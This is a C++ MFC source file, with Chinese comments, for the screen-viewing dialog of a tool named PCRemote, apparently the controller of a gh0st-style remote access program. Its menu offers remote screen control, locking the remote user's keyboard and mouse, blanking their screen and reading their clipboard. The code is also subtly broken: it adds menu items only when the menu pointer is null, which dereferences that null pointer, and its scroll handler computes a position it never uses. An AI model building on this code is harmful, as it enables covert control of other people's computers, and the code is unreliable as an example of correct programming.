// ScreenSpyDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include "..\..\common\macros.h"
enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉层
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
	IDM_ALGORITHM_SCAN,	// 隔行扫描算法
	IDM_ALGORITHM_DIFF,	// 差异比较算法
	IDM_DEEP_1,			// 屏幕色彩深度.....
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32
};
// 两种算法
#define ALGORITHM_SCAN	1	// 速度很快，但碎片太多
#define ALGORITHM_DIFF	2	// 速度很慢，也占CPU，但是数据量都是最小的
// CScreenSpyDlg 对话框

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialogEx)

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CScreenSpyDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true;
	m_lpScreenDIB = NULL;

	char szPath[MAX_PATH] = {0};
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17);

	sockaddr_in sockAddr;
	ZeroMemory(&sockAddr, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	int Ret = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = (Ret != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	UINT nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*)new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*)new BYTE[nBISize];

	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	ZeroMemory(&m_MMI, sizeof(MINMAXINFO));

	m_bIsCtrl = false;		//默认不控制
	m_nCount = 0;
	m_bCursorIndex = 1;
}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_GETMINMAXINFO()
	ON_WM_HSCROLL()
END_MESSAGE_MAP()


// CScreenSpyDlg 消息处理程序


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	//初始化菜单
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu *pSysMenu = GetSystemMenu(FALSE);
	if (!pSysMenu)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "发送Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉层(导致鼠标闪烁)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_SCAN, "隔行扫描算法(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_DIFF, "差异比较算法(&X)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, "1 位黑白(&A)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, "4 位灰度(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 位彩色(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY,  "8 位灰度(&D)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 位彩色(&E)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, "16位高彩(&F)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位真彩(&G)");		

		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);

	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.y = 0;

	m_bIsTraceCursor = false;

	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);

	InitMMI();
	SendNext();

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CScreenSpyDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);

	int	nBorderWidth = rectClient.left - rectWindow.left; // 边框宽
	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;
	int	nMinHeight = 300 + nHeightAdd;
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;

	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;

	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CScreenSpyDlg::SendNext(void)
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}


void CScreenSpyDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CDialogEx::OnClose();
}


void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if(m_MMI.ptMaxSize.x > 0)
		memcpy(lpMMI, &m_MMI, sizeof(MINMAXINFO));
	CDialogEx::OnGetMinMaxInfo(lpMMI);
}


void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	SCROLLINFO si;
	int i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return ;
	}
	CDialogEx::OnHScroll(nSBCode, nPos, pScrollBar);
}
